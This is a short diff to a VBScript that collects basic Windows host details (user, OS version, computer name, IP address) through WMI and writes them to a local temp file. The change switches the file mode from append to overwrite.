@@ -54,7 +54,7 @@ Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & s
 Set oss = objWMIService.ExecQuery ("Select * from Win32_OperatingSystem")
 
 For Each os in oss
-Set OutPutFile = FSO.OpenTextFile("C:\Users\"+strUserName+"\AppData\Local\Temp\out.txt" ,8 , True)
+Set OutPutFile = FSO.OpenTextFile("C:\Users\"+strUserName+"\AppData\Local\Temp\out.txt" ,2 , True)
 OutPutFile.WriteLine("Current User: " & strUserName & vbCrLf & "OS Type: " & os.Caption & vbCrLf & "Version: " & os.Version & vbCrLf & "Admin User: " & os.RegisteredUser & vbCrLf & "Computer Name: " & strComputerName  & vbCrLf & "Encryption Level: " & os.EncryptionLevel & vbCrLf & "IP Address:" & FinalIP)
 
 Set FSO = Nothing
